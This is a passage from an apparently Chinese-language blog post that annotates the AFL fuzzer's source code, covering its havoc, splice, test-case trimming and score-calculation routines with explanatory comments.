class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>: &#123;</span><br><span class="line"></span><br><span class="line">          u32 use_extra, extra_len, insert_at = UR(temp_len + <span class="number">1</span>);</span><br><span class="line">          u8* new_buf;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Insert an extra. Do the same dice-rolling stuff as for the</span></span><br><span class="line"><span class="comment">             previous case. */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!extras_cnt || (a_extras_cnt &amp;&amp; UR(<span class="number">2</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            use_extra = UR(a_extras_cnt);</span><br><span class="line">            extra_len = a_extras[use_extra].len;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (temp_len + extra_len &gt;= MAX_FILE) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            new_buf = ck_alloc_nozero(temp_len + extra_len);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Head */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(new_buf, out_buf, insert_at);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Inserted part */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(new_buf + insert_at, a_extras[use_extra].data, extra_len);</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            use_extra = UR(extras_cnt);</span><br><span class="line">            extra_len = extras[use_extra].len;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (temp_len + extra_len &gt;= MAX_FILE) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            new_buf = ck_alloc_nozero(temp_len + extra_len);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Head */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(new_buf, out_buf, insert_at);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Inserted part */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(new_buf + insert_at, extras[use_extra].data, extra_len);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Tail */</span></span><br><span class="line">          <span class="built_in">memcpy</span>(new_buf + insert_at + extra_len, out_buf + insert_at,</span><br><span class="line">                 temp_len - insert_at);</span><br><span class="line"></span><br><span class="line">          ck_free(out_buf);</span><br><span class="line">          out_buf   = new_buf;</span><br><span class="line">          temp_len += extra_len;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, temp_len))</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* out_buf might have been mangled a bit, so let&#x27;s restore it to its</span></span><br><span class="line"><span class="comment">     original size and shape. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (temp_len &lt; len) out_buf = ck_realloc(out_buf, len);</span><br><span class="line">  temp_len = len;</span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we&#x27;re finding new stuff, let&#x27;s run for a bit longer, limits</span></span><br><span class="line"><span class="comment">     permitting. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queued_paths != havoc_queued) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (perf_score &lt;= HAVOC_MAX_MULT * <span class="number">100</span>) &#123;</span><br><span class="line">      stage_max  *= <span class="number">2</span>;</span><br><span class="line">      perf_score *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    havoc_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Splice-Stage">Splice Stage</h3><p>这一部分是铰接阶段，用来将几个testcase的不同部分拼接在一起，并在之后通过havoc阶段进行变异</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;</span><br><span class="line">     queued_paths &gt; <span class="number">1</span> &amp;&amp; queue_cur-&gt;len &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>* <span class="title">target</span>;</span></span><br><span class="line">   u32 tid, split_at;</span><br><span class="line">   u8* new_buf;</span><br><span class="line">   s32 f_diff, l_diff;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* First of all, if we&#x27;ve modified in_buf for havoc, let&#x27;s clean that</span></span><br><span class="line"><span class="comment">      up... */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (in_buf != orig_in) &#123;</span><br><span class="line">     ck_free(in_buf);</span><br><span class="line">     in_buf = orig_in;</span><br><span class="line">     len = queue_cur-&gt;len;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 首先为了havoc清理in_buf</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Pick a random queue entry and seek to it. Don&#x27;t splice with yourself. */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">do</span> &#123; tid = UR(queued_paths); &#125; <span class="keyword">while</span> (tid == current_entry);</span><br><span class="line">   <span class="comment">// 选择一个随机queue内实例</span></span><br><span class="line">   splicing_with = tid;</span><br><span class="line">   target = <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> (tid &gt;= <span class="number">100</span>) &#123; target = target-&gt;next_100; tid -= <span class="number">100</span>; &#125;</span><br><span class="line">   <span class="keyword">while</span> (tid--) target = target-&gt;next;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Make sure that the target has a reasonable length. */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> (target &amp;&amp; (target-&gt;len &lt; <span class="number">2</span> || target == queue_cur)) &#123;</span><br><span class="line">     target = target-&gt;next;</span><br><span class="line">     splicing_with++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 对长度的检查</span></span><br><span class="line">   <span class="keyword">if</span> (!target) <span class="keyword">goto</span> retry_splicing;</span><br><span class="line"><span class="comment">// 如果直到遍历到最后都没有找到适合长度的，就重试</span></span><br><span class="line">   <span class="comment">/* Read the testcase into a new buffer. */</span></span><br><span class="line"></span><br><span class="line">   fd = open(target-&gt;fname, O_RDONLY);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, target-&gt;fname);</span><br><span class="line"></span><br><span class="line">   new_buf = ck_alloc_nozero(target-&gt;len);</span><br><span class="line"></span><br><span class="line">   ck_read(fd, new_buf, target-&gt;len, target-&gt;fname);</span><br><span class="line"></span><br><span class="line">   close(fd);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Find a suitable splicing location, somewhere between the first and</span></span><br><span class="line"><span class="comment">      the last differing byte. Bail out if the difference is just a single</span></span><br><span class="line"><span class="comment">      byte or so. */</span></span><br><span class="line"></span><br><span class="line">   locate_diffs(in_buf, new_buf, MIN(len, target-&gt;len), &amp;f_diff, &amp;l_diff);</span><br><span class="line">   <span class="comment">// 找到适合的拼接位置， </span></span><br><span class="line">   <span class="comment">// 首先找到第一个和最后一个不同的byte之间，并且避免只是单byte的不同</span></span><br><span class="line">   <span class="keyword">if</span> (f_diff &lt; <span class="number">0</span> || l_diff &lt; <span class="number">2</span> || f_diff == l_diff) &#123;</span><br><span class="line">     ck_free(new_buf);</span><br><span class="line">     <span class="keyword">goto</span> retry_splicing;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Split somewhere between the first and last differing byte. */</span></span><br><span class="line">   <span class="comment">// 然后在这个区间随机选择一个位置来进行拼接 </span></span><br><span class="line">   split_at = f_diff + UR(l_diff - f_diff);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Do the thing. */</span></span><br><span class="line"></span><br><span class="line">   len = target-&gt;len;</span><br><span class="line">   <span class="built_in">memcpy</span>(new_buf, in_buf, split_at);</span><br><span class="line">   in_buf = new_buf;</span><br><span class="line"></span><br><span class="line">   ck_free(out_buf);</span><br><span class="line">   out_buf = ck_alloc_nozero(len);</span><br><span class="line">   <span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">goto</span> havoc_stage;</span><br><span class="line">   <span class="comment">// 最后通过havoc阶段进行变异</span></span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在之后再一次运行到此时由于不再满足此if判断，于是结束循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;</span><br><span class="line">     queued_paths &gt; <span class="number">1</span> &amp;&amp; queue_cur-&gt;len &gt; <span class="number">1</span>) </span><br></pre></td></tr></table></figure><p>最终清理资源，并结束fuzz_one的运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ret_val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">abandon_entry:</span><br><span class="line"></span><br><span class="line">  splicing_with = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Update pending_not_fuzzed count if we made it through the calibration</span></span><br><span class="line"><span class="comment">     cycle and have not seen this entry before. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!stop_soon &amp;&amp; !queue_cur-&gt;cal_failed &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">    queue_cur-&gt;was_fuzzed = <span class="number">1</span>;</span><br><span class="line">    pending_not_fuzzed--;</span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;favored) pending_favored--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  munmap(orig_in, queue_cur-&gt;len);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_buf != orig_in) ck_free(in_buf);</span><br><span class="line">  ck_free(out_buf);</span><br><span class="line">  ck_free(eff_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret_val;</span><br></pre></td></tr></table></figure><h3 id="trim-case-对于testcase的修剪">trim_case | 对于testcase的修剪</h3><p>trim_case以2的幂次位置为单位进行裁剪,  每次修减后通过run_target 运行,  测试结果是否与原来相同。</p><p>最后如果发生了修剪，再更新bitmap_score</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 <span class="title function_">trim_case</span><span class="params">(<span class="type">char</span> **argv, <span class="keyword">struct</span> queue_entry *q, u8 *in_buf)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">64</span>];</span><br><span class="line">  <span class="type">static</span> u8 clean_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8 needs_write = <span class="number">0</span>, fault = <span class="number">0</span>;</span><br><span class="line">  u32 trim_exec = <span class="number">0</span>;</span><br><span class="line">  u32 remove_len;</span><br><span class="line">  u32 len_p2;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although the trimmer will be less useful when variable behavior is</span></span><br><span class="line"><span class="comment">     detected, it will still work to some extent, so we don&#x27;t check for</span></span><br><span class="line"><span class="comment">     this. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;len &lt; <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  stage_name = tmp;</span><br><span class="line">  bytes_trim_in += q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Select initial chunk len, starting with large steps. */</span></span><br><span class="line"></span><br><span class="line">  len_p2 = next_p2(q-&gt;len);</span><br><span class="line">  <span class="comment">// 以2的幂次向上取整</span></span><br><span class="line">  remove_len = MAX(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Continue until the number of steps gets too high or the stepover</span></span><br><span class="line"><span class="comment">     gets too small. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES))</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    u32 remove_pos = remove_len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;trim %s/%s&quot;</span>, DI(remove_len), DI(remove_len));</span><br><span class="line"></span><br><span class="line">    stage_cur = <span class="number">0</span>;</span><br><span class="line">    stage_max = q-&gt;len / remove_len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (remove_pos &lt; q-&gt;len)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      u32 trim_avail = MIN(remove_len, q-&gt;len - remove_pos);</span><br><span class="line">      u32 cksum;</span><br><span class="line"></span><br><span class="line">      write_with_gap(in_buf, q-&gt;len, remove_pos, trim_avail);</span><br><span class="line">      <span class="comment">// 将修剪后的输入写入outfile</span></span><br><span class="line">      fault = run_target(argv, exec_tmout);</span><br><span class="line">      <span class="comment">// 运行fuzz </span></span><br><span class="line">      trim_execs++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stop_soon || fault == FAULT_ERROR)</span><br><span class="line">        <span class="keyword">goto</span> abort_trimming;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Note that we don&#x27;t keep track of crashes or hangs here; maybe TODO? */</span></span><br><span class="line"></span><br><span class="line">      cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* If the deletion had no impact on the trace, make it permanent. This</span></span><br><span class="line"><span class="comment">         isn&#x27;t perfect for variable-path inputs, but we&#x27;re just making a</span></span><br><span class="line"><span class="comment">         best-effort pass, so it&#x27;s not a big deal if we end up with false</span></span><br><span class="line"><span class="comment">         negatives every now and then. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cksum == q-&gt;exec_cksum)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="comment">// 检查运行时bitmap是否与原来相等</span></span><br><span class="line">        u32 move_tail = q-&gt;len - remove_pos - trim_avail;</span><br><span class="line"></span><br><span class="line">        q-&gt;len -= trim_avail;</span><br><span class="line">        len_p2 = next_p2(q-&gt;len);</span><br><span class="line"></span><br><span class="line">        memmove(in_buf + remove_pos, in_buf + remove_pos + trim_avail,</span><br><span class="line">                move_tail);</span><br><span class="line">        <span class="comment">// 如果是，则更新testcase的len以及内存中的testcase </span></span><br><span class="line">        <span class="comment">/* Let&#x27;s save a clean trace, which will be needed by</span></span><br><span class="line"><span class="comment">           update_bitmap_score once we&#x27;re done with the trimming stuff. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!needs_write)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// 如果之前没有设置need_write，设置此标志 </span></span><br><span class="line">          needs_write = <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">memcpy</span>(clean_trace, trace_bits, MAP_SIZE);</span><br><span class="line">          <span class="comment">// 保存trace_bits</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        remove_pos += remove_len;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Since this can be slow, update the screen every now and then. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!(trim_exec++ % stats_update_freq))</span><br><span class="line">        show_stats();</span><br><span class="line">      stage_cur++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_len &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have made changes to in_buf, we also need to update the on-disk</span></span><br><span class="line"><span class="comment">     version of the test case. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (needs_write)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">// 如果发生了修剪，需要同步到磁盘里保存的testcase, 并且更新bitmap_score</span></span><br><span class="line">    s32 fd;</span><br><span class="line"></span><br><span class="line">    unlink(q-&gt;fname); <span class="comment">/* ignore errors */</span></span><br><span class="line"></span><br><span class="line">    fd = open(q-&gt;fname, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    ck_write(fd, in_buf, q-&gt;len, q-&gt;fname);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(trace_bits, clean_trace, MAP_SIZE);</span><br><span class="line">    update_bitmap_score(q);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">abort_trimming:</span><br><span class="line">  bytes_trim_out += q-&gt;len;</span><br><span class="line">  <span class="keyword">return</span> fault;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="calculate-score-对于testcase分数的计算">calculate_score | 对于testcase分数的计算</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u32 <span class="title function_">calculate_score</span><span class="params">(<span class="keyword">struct</span> queue_entry *q)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  u32 avg_exec_us = total_cal_us / total_cal_cycles;</span><br><span class="line">  u32 avg_bitmap_size = total_bitmap_size / total_bitmap_entries;</span><br><span class="line">  u32 perf_score = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Adjust score based on execution speed of this path, compared to the</span></span><br><span class="line"><span class="comment">     global average. Multiplier ranges from 0.1x to 3x. Fast inputs are</span></span><br><span class="line"><span class="comment">     less expensive to fuzz, so we&#x27;re giving them more air time. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.1</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.25</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">25</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.5</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">0.75</span> &gt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">75</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">4</span> &lt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">300</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">3</span> &lt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;exec_us * <span class="number">2</span> &lt; avg_exec_us)</span><br><span class="line">    perf_score = <span class="number">150</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Adjust score based on bitmap size. The working theory is that better</span></span><br><span class="line"><span class="comment">     coverage translates to better targets. Multiplier from 0.25x to 3x. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.3</span> &gt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.5</span> &gt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">0.75</span> &gt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">1.5</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">3</span> &lt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">0.25</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">2</span> &lt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">0.5</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;bitmap_size * <span class="number">1.5</span> &lt; avg_bitmap_size)</span><br><span class="line">    perf_score *= <span class="number">0.75</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Adjust score based on handicap. Handicap is proportional to how late</span></span><br><span class="line"><span class="comment">     in the game we learned about this path. Latecomers are allowed to run</span></span><br><span class="line"><span class="comment">     for a bit longer until they catch up with the rest. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;handicap &gt;= <span class="number">4</span>)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    perf_score *= <span class="number">4</span>;</span><br><span class="line">    q-&gt;handicap -= <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;handicap)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    perf_score *= <span class="number">2</span>;</span><br><span class="line">    q-&gt;handicap--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Final adjustment based on input depth, under the assumption that fuzzing</span></span><br><span class="line"><span class="comment">     deeper test cases is more likely to reveal stuff that can&#x27;t be</span></span><br><span class="line"><span class="comment">     discovered with traditional fuzzers. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (q-&gt;depth)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span> ... <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span 